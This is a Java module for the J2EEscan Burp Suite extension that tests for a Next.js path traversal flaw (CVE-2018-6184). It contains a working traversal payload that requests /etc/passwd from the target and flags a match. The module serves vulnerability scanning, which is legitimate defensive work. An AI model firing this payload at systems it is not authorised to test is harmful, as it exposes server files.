package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import burp.HTTPMatcher;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.IssuesHandler;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 *
 * Test for Next.js framework Path Traversal
 *
 * Reference:
 * http://blog.safebreach.com/2016/02/09/http-response-splitting-in-node-js-root-cause-analysis/
 * http://info.safebreach.com/hubfs/Node-js-Response-Splitting.pdf
 * CVE-2018-6184
 *
 */
public class NextFrameworkPathTraversal implements IModule {

    private static final String TITLE = "Next Javascript Framework Path Traversal";
    private static final String DESCRIPTION = "J2EEscan identified a vulnerable installation"
            + " of Next.js which is a framework for server-rendered React applications. <br />"
            + "The remote installation is vulnerable to path traversal.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://github.com/zeit/next.js/commit/02fe7cf63f6265d73bdaf8bc50a4f2fb539dcd00<br />"
            + "https://raz0r.name/vulnerabilities/arbitrary-file-reading-in-next-js-2-4-1/";

    private static final String REMEDY = "Update the software with the last security patches";

    private static final String NEXT_TRAVERSAL = "/_next/../../../../../../../../../etc/passwd";

    private PrintWriter stderr;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        stderr = new PrintWriter(callbacks.getStderr(), true);
                
        IExtensionHelpers helpers = callbacks.getHelpers();
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));

        if (!IssuesHandler.isvulnerabilityFound(callbacks,
                "Next Javascript Framework detected",
                protocol,
                host)) {
            return issues;

        }

        try {

            URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), NEXT_TRAVERSAL);
            byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);

            byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                    url.getPort(), isSSL, utf8LFIAttempt);

            if (HTTPMatcher.isEtcPasswdFile(responseBytes, helpers)) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        urlToTest,
                        new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.Low,
                        Confidence.Certain
                ));
                return issues;
            }

        } catch (MalformedURLException ex) {
            stderr.println(ex);
        } catch (Exception ex) {
            stderr.println(ex);
        }

        return issues;

    }
}
